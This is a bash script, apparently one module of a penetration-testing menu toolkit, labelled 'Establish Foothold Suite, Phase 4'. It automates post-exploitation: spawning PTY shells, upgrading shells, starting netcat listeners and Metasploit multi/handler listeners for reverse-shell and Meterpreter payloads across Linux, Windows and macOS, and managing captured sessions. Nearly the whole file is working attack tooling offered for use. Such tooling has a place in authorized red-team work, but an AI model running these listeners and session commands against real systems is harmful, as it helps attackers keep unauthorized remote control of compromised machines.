#!/bin/bash

#############################################################################
#                                                                           #
#  ESTABLISH FOOTHOLD SUITE                                                #
#  Phase 4: Stabilize and maintain access                                   #
#                                                                           #
#  Includes:                                                               #
#  - Shell stabilization                                                   #
#  - Reverse shell listeners                                               #
#  - Session management                                                    #
#                                                                           #
#############################################################################

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║              ESTABLISH FOOTHOLD SUITE                                     ║
║              Phase 4: Stabilize and maintain access                        ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

show_menu() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  ESTABLISH FOOTHOLD${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Shell Stabilization${NC}"
    echo "   F1.  Python PTY Spawn"
    echo "   F2.  Shell Upgrade Commands"
    echo "   F3.  Terminal Settings"
    echo ""
    echo -e "${YELLOW}Reverse Shell Listeners${NC}"
    echo "   F4.  Netcat Listener"
    echo "   F5.  Metasploit Handler"
    echo "   F6.  Multi-handler"
    echo ""
    echo -e "${YELLOW}Session Management${NC}"
    echo "   F7.  Check Active Sessions"
    echo "   F8.  Background/Foreground Sessions"
    echo "   F9.  Upgrade Shell to Meterpreter"
    echo ""
    echo -e "${RED}0. Exit to Main Menu${NC}"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
}

log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_good() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }

usage() {
    cat << EOF
USAGE: $0 [OPTIONS]

OPTIONS:
    F1                      Python PTY spawn
    F4                      Netcat listener
    --menu                  Show interactive menu
    --help                  Show this help

EXAMPLES:
    $0 F1
    $0 F4 443
    $0 --menu

EOF
}

handle_selection() {
    local choice="$1"
    shift

    run_cmd() {
        local cmd="$1"
        echo -e "${GREEN}[>] Running: ${cmd}${NC}"
        eval "$cmd"
    }

    case "$choice" in
        F1|f1)
            echo -e "${BLUE}[*] Python PTY Spawn${NC}"
            echo ""
            echo "[*] Spawning interactive PTY shell..."
            if command -v python3 &>/dev/null; then
                run_cmd "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
            elif command -v python &>/dev/null; then
                run_cmd "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
            else
                echo -e "${YELLOW}[!] python not found${NC}"
            fi
            ;;
        F2|f2)
            echo -e "${BLUE}[*] Shell Upgrade Commands${NC}"
            echo ""
            echo "[*] To upgrade shell to fully interactive:"
            echo "    1. Press: Ctrl+Z"
            echo "    2. Run: stty raw -echo; fg"
            echo "    3. Run: reset"
            echo "    4. Run: stty rows 24 cols 80"
            echo "    5. Run: export TERM=xterm"
            echo ""
            echo -n "[*] Press Enter to continue... "
            read
            ;;
        F3|f3)
            echo -e "${BLUE}[*] Terminal Settings${NC}"
            echo ""
            echo "[*] Setting terminal environment..."
            export TERM=xterm-256color
            echo -e "${GREEN}[>] TERM=xterm-256color${NC}"
            ;;
        F4|f4)
            echo -e "${BLUE}[*] Netcat Listener${NC}"
            echo ""
            echo -n "[*] Enter listen port: "
            read PORT
            PORT=${PORT:-443}
            echo ""
            if command -v nc &>/dev/null; then
                run_cmd "nc -lvnp ${PORT}"
            elif command -v ncat &>/dev/null; then
                run_cmd "ncat -lvnp ${PORT}"
            else
                echo -e "${YELLOW}[!] netcat not found${NC}"
            fi
            ;;
        F5|f5)
            echo -e "${BLUE}[*] Metasploit Handler${NC}"
            echo ""
            echo -n "[*] Enter LHOST: "
            read LHOST
            echo -n "[*] Enter LPORT: "
            read LPORT
            LPORT=${LPORT:-443}
            echo ""
            if command -v msfconsole &>/dev/null; then
                echo "[>] Starting Metasploit handler..."
                run_cmd "msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; exploit'"
            else
                echo -e "${YELLOW}[!] Metasploit not found${NC}"
            fi
            ;;
        F6|f6)
            echo -e "${BLUE}[*] Multi-handler (Generic Reverse Shell)${NC}"
            echo ""
            echo -n "[*] Enter LHOST: "
            read LHOST
            echo -n "[*] Enter LPORT: "
            read LPORT
            echo -n "[*] Select payload:"
            echo "    1. linux/x64/shell_reverse_tcp"
            echo "    2. windows/shell_reverse_tcp"
            echo "    3. osx/x64/shell_reverse_tcp"
            echo "    4. generic/shell_reverse_tcp"
            echo ""
            echo -n "[*] Choice: "
            read PAYLOAD_CHOICE
            case "$PAYLOAD_CHOICE" in
                1) PAYLOAD="linux/x64/shell_reverse_tcp" ;;
                2) PAYLOAD="windows/shell_reverse_tcp" ;;
                3) PAYLOAD="osx/x64/shell_reverse_tcp" ;;
                *) PAYLOAD="generic/shell_reverse_tcp" ;;
            esac
            echo ""
            if command -v msfconsole &>/dev/null; then
                run_cmd "msfconsole -q -x 'use exploit/multi/handler; set payload ${PAYLOAD}; set LHOST ${LHOST}; set LPORT ${LPORT}; exploit'"
            else
                echo -e "${YELLOW}[!] Metasploit not found${NC}"
            fi
            ;;
        F7|f7)
            echo -e "${BLUE}[*] Check Active Sessions${NC}"
            echo ""
            if command -v msfconsole &>/dev/null; then
                run_cmd "msfconsole -q -x 'sessions -l; exit'"
            else
                echo "[*] Active sessions would be shown here with Metasploit"
            fi
            ;;
        F8|f8)
            echo -e "${BLUE}[*] Background/Foreground Sessions${NC}"
            echo ""
            echo "[*] Session management commands:"
            echo "    Background: Ctrl+Z or 'background'"
            echo "    Foreground: sessions -i <id>"
            echo "    Kill: sessions -k <id>"
            echo "    List: sessions -l"
            echo ""
            echo -n "[*] Enter session ID to interact (or Enter to skip): "
            read SESSION_ID
            if [[ -n "$SESSION_ID" ]]; then
                if command -v msfconsole &>/dev/null; then
                    run_cmd "msfconsole -q -x 'sessions -i ${SESSION_ID}; exit'"
                fi
            fi
            ;;
        F9|f9)
            echo -e "${BLUE}[*] Upgrade Shell to Meterpreter${NC}"
            echo ""
            echo -n "[*] Enter session ID: "
            read SESSION_ID
            echo ""
            if [[ -n "$SESSION_ID" ]]; then
                if command -v msfconsole &>/dev/null; then
                    run_cmd "msfconsole -q -x 'sessions -u ${SESSION_ID}; exit'"
                else
                    echo -e "${YELLOW}[!] Metasploit not found${NC}"
                fi
            else
                echo -e "${YELLOW}[!] Missing session ID${NC}"
            fi
            ;;
        --menu)
            banner
            show_menu
            read -p "Enter choice: " choice
            handle_selection "$choice"
            ;;
        --help|-h)
            usage
            ;;
        *)
            log_warn "Invalid choice: $choice"
            usage
            ;;
    esac
}

main() {
    if [[ $# -gt 0 ]]; then
        handle_selection "$@"
        exit 0
    fi
    
    while true; do
        banner
        show_menu
        
        echo ""
        read -p "Enter choice: " choice
        
        if [[ "$choice" == "0" ]]; then
            echo -e "${GREEN}Returning to main menu...${NC}"
            exit 0
        fi
        
        handle_selection "$choice"
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

main "$@"
